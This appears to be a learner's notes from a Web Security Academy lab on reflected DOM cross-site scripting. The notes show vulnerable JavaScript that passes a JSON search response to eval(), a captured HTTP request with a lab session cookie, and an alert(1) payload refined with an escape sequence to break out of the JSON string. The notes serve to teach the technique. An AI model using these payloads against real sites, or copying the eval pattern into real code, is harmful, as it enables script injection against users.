/*
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {      //completed and successful request
            eval('var searchResultsObj = ' + this.responseText);   //add te response text
            displaySearchResults(searchResultsObj);
        }
    };

    xhr.open("GET", path + window.location.search);    //open the HTTP response
    xhr.send();                     //send the request to next function

//the searchResultsObject is passed in the next function
//the search function is called and as a result the xhr object is created
//

function displaySearchResults(searchResultsObj){....}

JSON object created with 2 keys, results and searchTerm
look at the AJAX HTTP request response in burp to search-results endpoint

HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 36

{"results":[],"searchTerm":"HAHAHA"}
              ||our_sink||
we should escape this and enter some payload
*/

// modified request

GET /search-results?search=HAHAHA\"-alert(1) HTTP/2
Host: 0a16000304296c63806c9f4b009d001c.web-security-academy.net
Cookie: session=eZloBcHTfxouTxRwgtCOt2hG6cV2qMDc
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a16000304296c63806c9f4b009d001c.web-security-academy.net/?search=HAHAHA
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers


-----------------------------------------------------
//this still wont work as the double quote at the end is because of the JSON object's
vakueless key. So maybe we can comment it out by----------------> 

HAHAHA\"-alert(1)}//
